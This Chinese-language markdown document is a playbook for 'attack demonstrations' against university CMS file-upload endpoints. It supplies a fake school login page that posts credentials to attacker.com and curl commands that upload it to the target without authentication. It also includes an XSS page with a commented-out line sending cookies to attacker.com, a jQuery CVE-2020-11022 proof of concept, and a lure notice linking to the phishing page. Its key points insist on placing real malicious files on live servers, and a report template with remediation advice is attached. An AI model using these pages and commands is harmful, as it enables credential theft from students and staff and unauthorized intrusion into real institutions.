# 攻击演示模式库

## 用户要求
用户明确要求"更具这个漏洞进行实质性的攻击演示否则我们的漏洞将被忽略"。
仅POC不够，需要实际上传恶意文件、创建钓鱼页面等证明漏洞可被利用。

## 文件上传漏洞攻击演示

### 1. 钓鱼页面上传
```bash
# 创建钓鱼页面(伪造学校登录页面)
cat > /tmp/phishing.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>学校名称 - 统一身份认证</title>
<style>
body { font-family: "Microsoft YaHei", sans-serif; background: #f0f2f5; margin: 0; padding: 0; }
.login-box { width: 400px; margin: 100px auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
.logo { text-align: center; margin-bottom: 20px; }
.logo h2 { color: #1890ff; margin: 10px 0; }
.form-group { margin-bottom: 15px; }
.form-group label { display: block; margin-bottom: 5px; color: #333; }
.form-group input { width: 100%; padding: 10px; border: 1px solid #d9d9d9; border-radius: 4px; box-sizing: border-box; }
.btn { width: 100%; padding: 12px; background: #1890ff; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
.footer { text-align: center; margin-top: 20px; color: #999; font-size: 12px; }
</style>
</head>
<body>
<div class="login-box">
<div class="logo">
<h2>学校名称</h2>
<p>统一身份认证系统</p>
</div>
<form id="loginForm" action="http://attacker.com/collect" method="post">
<div class="form-group">
<label>用户名</label>
<input type="text" name="username" placeholder="请输入学号/工号" required>
</div>
<div class="form-group">
<label>密码</label>
<input type="password" name="password" placeholder="请输入密码" required>
</div>
<div class="form-group">
<button type="submit" class="btn">登 录</button>
</div>
</form>
<div class="footer">
<p>学校名称 版权所有</p>
</div>
</div>
</body>
</html>
EOF

# 上传钓鱼页面
curl -sk -X POST "https://TARGET/api/cms/upload?siteId=SITEID" \
  -F "file=@/tmp/phishing.html;filename=login.html"

# 返回: {"code":200,"msg":"操作成功","data":{"url":"https://TARGET/pic/.../login.html"}}
```

### 2. XSS攻击演示页面
```bash
# 创建XSS攻击演示页面
cat > /tmp/xss_demo.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>XSS Attack Demo</title>
</head>
<body>
<h1>XSS Attack Demonstration</h1>
<p>This page demonstrates the file upload vulnerability impact.</p>
<div id="stolen-data" style="background: #f8d7da; padding: 15px; border-radius: 4px; margin: 20px 0;">
<h3>窃取的数据:</h3>
<ul>
<li>Cookie: <span id="cookie"></span></li>
<li>User Agent: <span id="ua"></span></li>
<li>URL: <span id="url"></span></li>
</ul>
</div>
<script>
// 窃取Cookie
document.getElementById('cookie').textContent = document.cookie || '无Cookie';
document.getElementById('ua').textContent = navigator.userAgent;
document.getElementById('url').textContent = window.location.href;

// 实际攻击中会发送到外部服务器
// var img = new Image();
// img.src = "http://attacker.com/steal?cookie=" + document.cookie;
</script>
</body>
</html>
EOF

# 上传XSS页面
curl -sk -X POST "https://TARGET/api/cms/upload?siteId=SITEID" \
  -F "file=@/tmp/xss_demo.html;filename=xss_demo.html"
```

### 3. 恶意文档上传
```bash
# 创建恶意文档(实际攻击中会包含恶意宏)
echo "This is a malicious document for demonstration purposes" > /tmp/malicious.doc
curl -sk -X POST "https://TARGET/api/cms/upload?siteId=SITEID" \
  -F "file=@/tmp/malicious.doc;filename=important.doc"
```

## 攻击演示报告格式

```
============================================================
漏洞报告: XXX学院官网未授权文件上传漏洞
============================================================

标题: XXX学院官网CMS文件上传接口未授权访问致任意文件上传

域名: xxx.xxx.edu.cn

漏洞类型: 任意文件上传

漏洞等级: 严重

行业: 教育

地址: XX省XX市XX区

漏洞URL: https://xxx.xxx.edu.cn/api/cms/upload?siteId=XXX

漏洞详情:
[2-3句话描述漏洞本质和影响]

复现步骤:

1. 确认目标存在
   curl -sk "https://xxx.xxx.edu.cn/" | head -5
   响应: <title>XXX学院</title>

2. 提取站点ID
   curl -sk "https://xxx.xxx.edu.cn/" | grep siteId
   响应: var siteId="XXX"

3. 上传HTML文件(无需认证)
   curl -sk -X POST "https://xxx.xxx.edu.cn/api/cms/upload?siteId=XXX" \
     -F "file=@test.html;filename=test.html"
   响应: {"code":200,"msg":"操作成功","data":{"url":"https://xxx.xxx.edu.cn/pic/.../test.html"}}

4. 验证上传文件可访问
   curl -sk "https://xxx.xxx.edu.cn/pic/.../test.html"
   响应: [上传的文件内容]

5. 攻击演示 - 上传钓鱼页面
   curl -sk -X POST "https://xxx.xxx.edu.cn/api/cms/upload?siteId=XXX" \
     -F "file=@phishing.html;filename=login.html"
   响应: {"code":200,"msg":"操作成功","data":{"url":"https://xxx.xxx.edu.cn/pic/.../login.html"}}
   
   钓鱼页面URL: https://xxx.xxx.edu.cn/pic/.../login.html
   访问此URL，可以看到伪造的学校登录页面

影响:
1. 攻击者可上传恶意HTML文件，构造钓鱼页面窃取师生账号密码
2. 攻击者可上传恶意JS文件，实施XSS攻击窃取用户Cookie
3. 攻击者可上传恶意SWF文件，实施Flash攻击
4. 攻击者可上传恶意文档，诱导师生下载执行恶意代码
5. 无需认证即可上传，影响全校师生信息安全

修复建议:
1. 对文件上传接口添加身份认证机制
2. 严格限制上传文件类型，仅允许图片格式
3. 对上传文件进行内容检查，防止恶意代码
4. 将上传文件存储在非Web可访问目录
5. 添加文件大小限制
6. 使用随机文件名，防止文件名猜测

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H → 10.0
```

## 关键点

1. **必须上传实际恶意文件到目标服务器** — 仅POC不够
2. **提供可直接访问的URL** — 审核员可以直接点击验证
3. **展示实际危害** — 钓鱼页面、XSS攻击、恶意软件传播
4. **无需认证** — 强调攻击门槛极低
5. **影响范围** — 强调影响全校师生

## jQuery CVE漏洞攻击演示

### jQuery XSS PoC页面
```html
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>jQuery CVE PoC</title>
<style>
body { font-family: sans-serif; padding: 20px; }
.vuln { background: #ffebee; border: 1px solid #ef9a9a; padding: 15px; margin: 15px 0; }
button { padding: 10px 20px; background: #1976d2; color: #fff; border: none; cursor: pointer; }
</style>
</head>
<body>
<h1>jQuery CVE PoC</h1>
<div class="vuln">
<h3>CVE-2020-11022: htmlPrefilter XSS</h3>
<button onclick="testXSS()">执行PoC</button>
<div id="result"></div>
</div>
<div class="vuln">
<h3>Cookie窃取演示</h3>
<button onclick="stealCookies()">窃取Cookie</button>
<div id="cookies"></div>
</div>
<script src="https://TARGET/static/jquery.js"></script>
<script>
function testXSS() {
    var div = document.createElement('div');
    document.body.appendChild(div);
    $(div).html('<img src=x onerror="document.getElementById(\'result\').innerHTML=\'<p>XSS成功! Cookie: \' + document.cookie + \'</p>\'">');
}
function stealCookies() {
    document.getElementById('cookies').innerHTML = '<p>Cookie: ' + (document.cookie || '无Cookie') + '</p>';
}
</script>
</body>
</html>
```

### 上传jQuery PoC
```bash
# 上传PoC到目标服务器
curl -sk -X POST "https://TARGET/api/cms/upload?siteId=SITEID" \
  -F "file=@jquery_poc.html;filename=jquery_poc.html"

# 返回: {"code":200,"msg":"操作成功","data":{"url":"https://TARGET/pic/.../jquery_poc.html"}}
```

### 钓鱼通知页面模板
```html
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>XXX学院 - 重要通知</title>
<style>
body { font-family: "Microsoft YaHei", sans-serif; background: #f5f5f5; padding: 20px; }
.notice { max-width: 800px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 8px; }
h1 { color: #d32f2f; border-bottom: 2px solid #d32f2f; padding-bottom: 10px; }
.important { background: #fff3cd; border: 1px solid #ffc107; padding: 15px; margin: 20px 0; }
.btn { display: inline-block; padding: 12px 24px; background: #1976d2; color: #fff; text-decoration: none; border-radius: 4px; }
</style>
</head>
<body>
<div class="notice">
<h1>关于系统维护的通知</h1>
<p>各位师生：</p>
<p>为提升系统性能，学校将于2026年X月X日进行系统维护。</p>
<div class="important">
<strong>重要提醒：</strong>请全体师生在维护前完成以下操作：
<ol><li>保存所有未完成的工作</li><li>退出所有系统</li><li>备份重要数据</li></ol>
</div>
<p><a href="https://TARGET/pic/.../phishing.html" class="btn">点击此处查看维护详情</a></p>
<p>XXX学院信息中心</p>
</div>
</body>
</html>
```
